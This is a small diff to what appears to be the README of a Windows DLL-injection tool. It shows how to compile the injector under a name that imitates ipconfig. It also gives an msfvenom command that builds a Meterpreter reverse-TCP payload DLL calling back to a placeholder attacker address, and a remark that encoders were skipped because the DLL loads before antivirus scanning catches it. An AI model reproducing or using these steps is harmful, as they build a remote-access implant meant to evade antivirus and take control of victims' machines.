@@ -23,7 +23,7 @@ Compilation:
 i686-w64-mingw32-gcc dllinject.c -o ipconfigg.exe
 
 DLL generation :
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip> lport=<desired port> -f dll -o test.dll
+msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip lport=desired_port -f dll -o test.dll
 
 I have purposely not used any encoders as the process is fast enought to load the dll on runtime, before the AV software daemon runcheck detects it.
 
